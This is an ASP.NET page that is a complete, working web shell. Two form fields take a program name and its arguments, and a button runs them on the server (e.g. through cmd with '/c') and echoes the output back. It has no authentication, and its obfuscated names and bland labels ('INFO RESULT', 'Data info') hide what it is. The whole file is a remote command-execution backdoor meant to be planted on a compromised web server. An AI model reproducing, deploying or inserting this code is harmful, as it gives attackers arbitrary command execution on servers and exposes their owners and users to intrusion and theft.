<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{

}
//Ckp ver 1.0
string AA(string argA, string argB)
{
	try{
		ProcessStartInfo Finder = new ProcessStartInfo();
		Finder.FileName = argA;
		Finder.Arguments = "/c "+argB;
		Finder.RedirectStandardOutput = true;
		Finder.UseShellExecute = false;
		Process p = Process.Start(Finder);
		StreamReader stmrdr = p.StandardOutput;
		string userResp = stmrdr.ReadToEnd();
		stmrdr.Close();

		return userResp;
	}
	catch (Exception ex)
	{
		Response.Write(ex);
		return "\nFAILED";
	}
}
//Data info
void YY(object sender, System.EventArgs e)
{
	Response.Write("Resp-Term:");
	Response.Write("<pre>");
	Response.Write(Server.HtmlEncode(AA(QQ.Text, QQA.Text)));
	Response.Write("</pre>");
}
</script>

<HTML>
	<HEAD>
	<title>INFO RESULT</title>
	</HEAD>
	<body >
		<form id="UserCheck" method="post" runat="server">
			<asp:TextBox id="QQ" runat="server" Width="250px"></asp:TextBox>
			<asp:TextBox id="QQA" runat="server" Width="250px"></asp:TextBox>

			<asp:Button id="CC" runat="server" Text="excute" OnClick="YY"></asp:Button>
			<asp:Label id="BB"  runat="server">Command:</asp:Label>
		</form>


	</body>
</HTML>
